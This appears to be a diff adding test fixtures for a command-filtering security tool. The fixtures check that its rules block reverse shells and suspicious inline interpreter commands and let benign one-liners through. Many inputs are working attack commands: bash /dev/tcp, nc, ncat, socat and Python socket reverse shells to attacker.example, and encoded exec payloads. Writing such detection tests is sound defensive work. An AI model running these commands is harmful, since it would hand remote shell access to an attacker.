@@ -1515,6 +1515,164 @@ context = "exec"
 expected_action = "allow"
 expected_rules = []
 
+# ── PR3: LOTL — reverse shells (Atomic Red Team-derived, MIT corpus) ────────
+# Fixtures encode techniques catalogued in the Atomic Red Team project (MIT,
+# https://github.com/redcanaryco/atomic-red-team); no rule text is copied.
+
+[[fixture]]
+name = "rev_shell_bash_dev_tcp"
+min_milestone = 1
+input = "bash -i >& /dev/tcp/attacker.example/4444 0>&1"
+context = "exec"
+expected_action = "block"
+expected_rules = ["reverse_shell"]
+forbidden_rules = ["interpreter_suspicious_inline_exec", "pipe_to_interpreter"]
+
+[[fixture]]
+name = "rev_shell_nc_e"
+min_milestone = 1
+input = "nc -e /bin/sh attacker.example 4444"
+context = "exec"
+expected_action = "block"
+expected_rules = ["reverse_shell"]
+forbidden_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "rev_shell_ncat_exec"
+min_milestone = 1
+input = "ncat --exec /bin/bash attacker.example 4444"
+context = "exec"
+expected_action = "block"
+expected_rules = ["reverse_shell"]
+
+[[fixture]]
+name = "rev_shell_nc_flag_after_host"
+min_milestone = 1
+input = "nc attacker.example 4444 -e /bin/sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["reverse_shell"]
+
+[[fixture]]
+name = "rev_shell_socat_exec"
+min_milestone = 1
+input = "socat TCP:attacker.example:4444 EXEC:/bin/sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["reverse_shell"]
+
+# Boundary: a plain nc connectivity check (no exec flag) must NOT fire.
+[[fixture]]
+name = "nc_connectivity_check_no_fire"
+min_milestone = 1
+input = "nc -zv example.com 443"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["reverse_shell"]
+
+# ── PR3: LOTL — inline interpreter with suspicious payload ──────────────────
+
+[[fixture]]
+name = "py_inline_subprocess_shell"
+min_milestone = 1
+input = "python3 -c 'import subprocess; subprocess.call([\"/bin/sh\",\"-i\"])'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+forbidden_rules = ["reverse_shell"]
+
+[[fixture]]
+name = "py_inline_os_system"
+min_milestone = 1
+input = "python3 -c 'import os; os.system(\"id\")'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "node_inline_child_process"
+min_milestone = 1
+input = "node -e 'require(\"child_process\").execSync(\"id\")'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "perl_inline_system"
+min_milestone = 1
+input = "perl -e 'system(\"id\")'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "php_inline_system"
+min_milestone = 1
+input = "php -r 'system(\"id\");'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+# Non-base64 decode-execute (hex): owned by this rule, NOT base64_decode_execute.
+[[fixture]]
+name = "py_inline_hex_decode_exec"
+min_milestone = 1
+input = "python3 -c 'exec(bytes.fromhex(\"6f732e73797374656d2827696427290a\").decode())'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+forbidden_rules = ["base64_decode_execute"]
+
+# Interpreter socket reverse shell classifies here, not as reverse_shell.
+[[fixture]]
+name = "py_inline_socket_reverse_shell"
+min_milestone = 1
+input = "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.example\",4444));os.dup2(s.fileno(),0);subprocess.call([\"/bin/sh\",\"-i\"])'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+forbidden_rules = ["reverse_shell"]
+
+# Dedup boundary: the base64 decode-execute shape stays owned by
+# base64_decode_execute; the inline-exec rule must NOT double-fire on it.
+[[fixture]]
+name = "b64_inline_owned_by_base64_rule"
+min_milestone = 1
+input = "python3 -c \"exec(__import__('base64').b64decode('aWQ='))\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["base64_decode_execute"]
+forbidden_rules = ["interpreter_suspicious_inline_exec"]
+
+# Boundary: benign inline one-liners (no exec/spawn/socket/network) must NOT fire.
+[[fixture]]
+name = "py_inline_print_no_fire"
+min_milestone = 1
+input = "python3 -c 'print(1)'"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "py_inline_json_load_no_fire"
+min_milestone = 1
+input = "python -c 'import json,sys; json.load(sys.stdin)'"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "node_inline_console_log_no_fire"
+min_milestone = 1
+input = "node -e 'console.log(1+1)'"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["interpreter_suspicious_inline_exec"]
+
 # ── M5 chunk 1: PowerShell-specific rules ───────────────────────────────
 
 [[fixture]]
